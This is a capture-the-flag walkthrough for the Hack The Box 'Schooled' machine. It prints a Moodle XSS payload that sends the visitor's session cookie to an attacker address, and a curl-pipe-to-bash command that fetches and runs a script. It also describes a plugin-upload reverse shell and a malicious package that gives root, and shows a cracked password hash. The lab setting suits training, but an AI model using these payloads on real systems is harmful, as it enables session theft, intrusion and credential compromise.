# My solution

## Enumeration

Start with  nmap enumeration
```bash
$ nmap -sC -sV -oN nmap-initial 10.10.10.234

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 18:00 CEST
Nmap scan report for 10.10.10.234
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:69:83:78:fc:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)
|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)
|_  256 7f:51:88:f7:3c:dd:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (FreeBSD) PHP/7.4.15
|_http-title: Schooled - A new kind of educational institute
Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.57 seconds

```

We write down the apache and php version
```bash
Apache httpd 2.4.46 ((FreeBSD) PHP/7.4.15)
```


The website has been written in php, so we use dirbuster with  php extension enabled.  
It doesn't produce any interesting result.

By enumerating all the remote ports, we discover another open port: `33060/tcp open  mysqlx`


## Mysqlx

Mysqlx is an eXtended version of Mysql. 

We create a quick script to interact with the service.

>![](imgs/20210508-192057.png)

But

>![](imgs/20210508-192151.png)


We try to log in using the name of teachers we found in the website but none of them works. 

Given the presence of `mysqlix`, a database is running on the remote machine. So we repeat the directory enumeration with other possible extensions (db,conf). Again, gobuster is useless in this case.

We keep enumerating

## Subdomain enumeration 

A DNS zone transfer is not going to work as there is no DNS server listening in the target machine.

We can however try to bruteforce the subdomains using `gobuster vhost`. 

In this mode, gobuster will visit each subdomain we provide with a wordlist file and based on the response it will decide whether the subdomain exists or not


```
gobuster vhost -u http://schooled.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster-subdomain.txt -t 40
```

It finds `moodle.schooled.htb`.

We add it to the `/etc/hosts` file and we visit the root page

## Moodle.schooled.htb

>![](imgs/20210511-210614.png)


We create an account and log in to Moodle.
The mail we register needs to have a  `student.schooled.htb` domain.

Once logged in, we can register to the math course and look at the teacher's profile. 

>![](imgs/20210511-212014.png)

Now that we have the teachers' domain, we can try to register to Moodle using a `@staff.schooled.htb` account. We may be able to get  teacher role.

Too easy to be true. It doesn't work:
>![](imgs/20210511-212450.png)`


## Moodle enumeration

We fire up gobuster both on the root directory and under the `moodle` directory

```bash
gobuster dir -u http://moodle.schooled.htb/moodle/ -w /usr/share/wordl[0/8]dirbuster/directory-list-2.3-medium.txt -o gobuster-moodle.txt -t 40 -x php,db
```

>![](imgs/20210511-222419.png)

We have a bunch of files but after a closer analysis none of them seems very useful.

Instead, we find a tool for moodle enumeration: https://github.com/inc0d3/moodlescan.

We run it with `python3 moodlescan.py -k -u http://moodle.schooled.htb/moodle`.  
The -k option ignores the certificate

>![](imgs/20210514-181534.png)

Version number is 3.9-beta.  
We can check if there are known exploits for Moodle 3.9-beta. 

Many Moodle vulnerabilities can be found here: https://snyk.io/vuln/composer:moodle%2Fmoodle

There are a bunch of vulnerabilities for the 3.9. 

If we read the Math teacher's announcement carefully, we can clearly guess what is the kind of vulnerability that may be exploited.

>![](imgs/20210512-205801.png)


As guessable by the announcment, the teacher will visit the student's profile therefore suggesting an XSS vulnerability.

### PrivEsc from student role:  XSS - CVE-2020-25627


A high impact XSS vulnerability stands out for the unsufficient sanitization of the `moodlenetprofile` (also mentioned in the announement).


>![](imgs/20210518-212551.png)

>![](imgs/20210518-213703.png)

We first try to confirm the vulnerability

>![](imgs/20210518-232825.png)

and it works

>![](imgs/20210518-232850.png)


We know the teacher will visit our profile. So we can exploit this vulnerability and make the teacher kindly send his session cookies to us. 

This time our payload is: `<img src=x onerror=this.src='http://10.10.14.44:8000/?c='+document.cookie>`


We wait a bit and we get 

>![](imgs/20210518-235433.png)

We set the new cookie and we can successfully log in as the teacher Manuel Philips

>![](imgs/20210518-235810.png)


## PrivEsc from teacher role : CVE-2020-14321

We look at vulnerabilities of moodle 3.9 beta again

>![](imgs/20210520-120248.png)


A Proof of Concept has been implemented here: https://github.com/HoangKien1020/CVE-2020-14321.

We first enroll the IT teacher Jamie Borham (as we thought he had Manager role).

>![](imgs/20210520-121949.png)



We turn burp suite on and temper the request as shown in the PoC in order to self-assign Manager.  
(We are using `userList[]=24` because **24** is the id of the Math teacher)

>![](imgs/20210520-122613.png)

Response is successful

>![](imgs/20210520-122720.png)


And we have manager role now

>![](imgs/20210520-123240.png)


Although we have Manager's permission, we cannot login as Jamie Borham (probably he isn't a Manager?).

So we repeat the steps for the other teachers and we manage to get the Manager role by logging in as Lianne Carter

>![](imgs/20210524-003253.png)


It's now time of RCE. We navigate to the `plugins` tab and install a new plugin as shown in the PoC.  
(We used the *pentestermonkey* php reverse shell as malicious payload)

>![](imgs/20210524-001958.png)


Visiting `http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php`:

>![](imgs/20210524-010449.png)


### User
We are in a freeBSD distro.

We start by stabilizing the shell:

```bash
$ find . -iname python3 2>/dev/null
./usr/local/bin/python3
./usr/local/share/bash-completion/completions/python3
$ /usr/local/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'
[www@Schooled /]$ 
```


We run linpeas. curl is in `/usr/local/bin/`.
```bash
/usr/local/bin/curl http://10.10.14.217:9002/linpeas.sh | /bin/bash
```

We find the credentials of the mysql database:

>![](imgs/20210524-014102.png)


We can log in

>![](imgs/20210524-015535.png)


take username and passwords from mdl_user table

>![](imgs/20210524-015920.png)

We are interested to these ones:

>![](imgs/20210524-021745.png)

And in particular to the admin's password (Jamie)

We can crack the hash using `hashcat`.  
The algorith used for the hash is *bcrypt*

```bash
hashcat -a 0 -m 3200 hashes /usr/share/wordlists/rockyou.txt --username
```

We manage to crack the hash:

```bash
$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt --username --show
admin:$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
```

## Root

>![](imgs/20210524-042322.png)

The `pkg install *` is indeed very suspicious there.

We can look it up on GTFObins and easily follow the instructions.

We create the file containing our reverse shell (I tried a couple of them before finding one that actually worked)

>![](imgs/20210524-223850.png)

Then we create the freeBSD malicious package with `fpm -n x -s dir -t freebsd -a all --before-install pwn/pwn.sh pwn`

We can send the package to the machine with `scp`


To install the package on the remote host and trigger our malicious code: `jamie@Schooled:~ $ sudo pkg install -y --no-repo-update ./x-1.0.txz`


The reverse shell works and we are root now.
```bash
$ nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.14.217] from (UNKNOWN) [10.10.10.234] 15762
# whoami
root

```


